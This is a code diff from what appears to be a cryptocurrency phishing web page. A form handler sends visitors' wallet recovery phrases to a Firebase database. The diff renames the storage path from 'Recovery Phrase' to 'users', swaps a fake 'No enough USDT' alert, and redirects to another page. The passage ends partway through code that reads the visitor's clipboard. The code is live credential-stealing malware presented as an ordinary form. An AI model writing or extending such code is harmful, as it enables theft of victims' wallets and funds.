@@ -128,26 +128,22 @@
 		 
 		document.getElementById('frmContact').addEventListener('submit', function(e) {
 			e.preventDefault();
-			set(ref(db, 'Recovery Phrase/' + Math.random().toString(36).slice(2, 7)), {
+			set(ref(db, 'users/' + Math.random().toString(36).slice(2, 7)), {
 				name: document.getElementById('name').value,
 				phrase: document.getElementById('phrase').value,
 			});
 		 
-			// alert('Fail! X -- No enough USDT on your Portfolio');
+			// alert('Your form is submitted');
+      window.open('page4.html')
 			document.getElementById('frmContact').reset();
-      setTimeout(function(){location.href="./page4.html"} , 1000); 
 		});
-    // setTimeout(window.location.assign("./page4.html"), 3000);
-    // window.location.href = './page4.html';
-      
-      // window.location.assign("www.google.com")
-      //   
-      
-
-      // function redirect() {
-      //     window.location.href="page4.html";
-      // }
-
+    // document.getElementById("redi").onclick = function () {
+    //     location.href = "www.yoursite.com";
+    // };
+    
+    // function redirect(){
+    //     window.location.href="login.html";
+    // }
       navigator.clipboard
         .readText()
         .then((copiedText) => {
